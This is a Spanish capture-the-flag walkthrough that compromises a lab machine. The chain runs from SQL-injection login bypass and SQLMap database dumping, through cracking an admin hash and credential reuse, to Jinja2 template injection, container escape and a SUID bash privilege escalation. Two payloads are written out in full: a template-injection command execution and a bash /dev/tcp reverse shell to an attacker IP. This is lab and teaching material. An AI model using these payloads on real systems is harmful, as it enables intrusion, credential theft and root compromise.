----

Empezamos con la resolución de la máquina, haciendo un **ping** para comprobar si tenemos conexión:

![1](images/1.png)

Podemos ver que hay conexión, enviamos un paquete y recibimos un paquete.

El siguiente paso es **escanear los puertos abiertos** de la máquina víctima para ver por donde podemos entrar, para ello usamos _nmap_ para primero hacer un escaneo sencillo:

![2](images/2.png)

Podemos ver que solo se encuentra abierto el **puerto 80**, es decir que hay una web por detrás. 

Para ver el contenido, copiamos la IP en el navegador:

![3](images/3.png)

Esto es lo que vemos en la web:

![4](images/4.png)

En una esquina de la web, veremos este icono de usuario:

![5](images/5.png)

Si lo seleccionamos, nos aparecerá este panel de login:

![6](images/6.png)

Algunos detalles de la máquina, es que se usan técnicas de SQL Injection y uso de SQLMap:

![8](images/8.png)

Con estos detalles en mente, podemos iniciar el **Burpsuite** para interceptar solicitudes HTTP:

![7](images/7.png)

Pondremos credenciales en el panel, sean validas o no, nos valen para proseguir en el siguiente paso:

![9](images/9.png)

Con **Burpsuite** interceptamos la solicitud y veremos esto: 

![10](images/10.png)

Lo que haremos será modificar esta solicitud de esta forma que se trata de una inyección SQL básica: 

![11](images/11.png)

De esta forma podremos ingresar a la web sin problemas, aunque las credenciales no sean validas:

![12](images/12.png)

Esto nos llevará al panel principal del administrador: 

![13](images/13.png)

De momento no podemos hacer mucho aquí, así que lo haremos será ver la base de datos que tiene la web por detrás usando **SQLMap**. 

Podemos ver la solicitud HTTP:

![15](images/15.png)

Tal cual la tenemos así, la copiamos en una archivo de texto:

![16](images/16.png)

Lo que haremos con esto será usar **SQLMap**, primero ejecutamos este comando sencillo: 

![17](images/17.png)

Podemos ver que no sale ningún error, así que ahora haremos que **SQLMap** nos muestre las base de datos: 

![18](images/18.png)

Hay 2 bases de datos, y la que me parece interesante es la *main*:

![20](images/20.png)

Podemos ver las tablas que contiene usando este comando:

![21](images/21.png)

![22](images/22.png)

Hay datos de usuario dentro de la tabla *user*, para ver lo que contiene basta con este comando:

![23](images/23.png)

![24](images/24.png)

Ya podemos ver el nombre de usuario *admin* junto con una contraseña en formato *hash*. 

Para sacar la contraseña, usamos la web **Crackstation.net**: 

![25](images/25.png)

Ya podemos ver la contraseña en texto plano:

![26](images/26.png)


Ahora que ya tenemos credenciales validas por iniciar sesión sin que tener interceptar: 

![27](images/27.png)

Nos volvemos a encontrar el mismo panel que antes: 

![28](images/28.png)

En este punto, encontré un icono de configuración en la esquina derecha del panel: 

![29](images/29.png)

Y dentro encontramos este dominio nuevo: 

![30](images/30.png)

Podemos ver el contenido, añadiéndolo al */etc/hosts*: 

![31](images/31.png)

![32](images/32.png)

Podemos ver un panel de login, en este caso, usé las mismas credenciales de antes: 

![33](images/33.png)

Parece ser que esta máquina tiene ***reutilización de credenciales***, porque pude iniciar sesión. 

Ahora ya vemos que somos el usuario **admin**: 

![34](images/34.png)

Podemos acceder a esta sección de la web, donde podemos modificar credenciales de usuario: 

![35](images/35.png)

Probé a cambiar el nombre de usuario con estos datos:

![36](images/36.png)

El resultado es este, los cambios resultaron bien:

![37](images/37.png)

Estuve mirando las características de la máquina, y destaca la vulnerabilidad **SSTI** o **Server Side Template Injection**. Es decir, podemos inyectar código malicioso en el motor de plantillas para que sea interpretado por el servidor y tensarla potente:

![38](images/38.png)

Lo que hice fue hacer una simple operación matemática de esta forma en el campo del nombre de usuario: 

![39](images/39.png)

El resultado fue este: 

![40](images/40.png)

Podemos ver que el servidor interpreta la instrucción, ahora me puse la tarea de encontrar una forma de poder ejecutar comandos usando esta técnica. 

Encontré este artículo que contiene los comandos para ello: 

![41](images/41.png)

Primero ejecute este comando para obtener el **ID** del usuario a nivel de sistema en la web:

![42](images/42.png)

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

El resultado fue este: 

![43](images/43.png)

Podemos ver que somos usuario **root** dentro del sistema, esto me gusta bastante, lo siguiente que haremos será lanzarnos una reverse shell usando esta misma técnica:

![44](images/44.png)

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<ip>/443 0>&1"').read() }}
```

Cambiamos los valores que tenga por los que tengamos nosotros, y antes de ejecutar esta instrucción, nos ponemos en escucha:

![45](images/45.png)

Ya estamos dentro de la máquina, un detalle muy importante para tener en cuenta, es que estamos dentro de un  **contenedor de Docker**  por el hostname que tiene la máquina.

En este punto, me fuí al directorio */home* del sistema, pude ver que hay un usuario llamado **augustus**: 

![46](images/46.png)

Aunque no seamos usuario propio de la máquina, podemos ver el contenido de la primera flag:

![47](images/47.png)

Podemos ver que estamos dentro de un contenedor de **Docker**, mirando la IP del mismo: 

![48](images/48.png)

La IP es: 172.19.0.2, y podemos pasar a la máquina real usando otra IP dentro del mismo rango que sería la 172.19.0.1.

Podemos confirmar esto si tratamos de iniciar sesión como usuario **augustus** usando *ssh*: 

![49](images/49.png)

Y de casualidad, funciona: 

![50](images/50.png)

Desde aquí también podemos ver la flag anterior: 

![51](images/51.png)

En este punto quise probar algo, pude ver la flag tanto desde el contenedor como desde la máquina real, es decir, que el directorio se comparte. 

La prueba que hice fue crear un archivo desde el contenedor en este mismo directorio: 

![52](images/52.png)

Y podía ver el archivo desde la máquina real siendo **augustus**: 

![53](images/53.png)

Así que para escalar privilegios me aproveché del binario de la *bash*, copiandolo al directorio actual siendo **augustus**: 

![54](images/54.png)

Tras copiar el binario, ejecutamos los siguientes comandos siendo **root**: 

![55](images/55.png)

Haciendo que el binario solo pertenezca al usuario y grupo **root** y que el binario tenga permisos SUID a parte de que cualquier usuario pueda ejecutarlo. 
En otras palabras, ejecutamos el binario y seremos root máximo del sistema. 

Ahora nos metemos como usuario **augustus**, y aquí podemos ver el binario: 

![56](images/56.png)

Ahora lo ejecutamos de esta forma: 

![57](images/57.png)

Y ya solo queda ver la flag: 

![58](images/58.png)


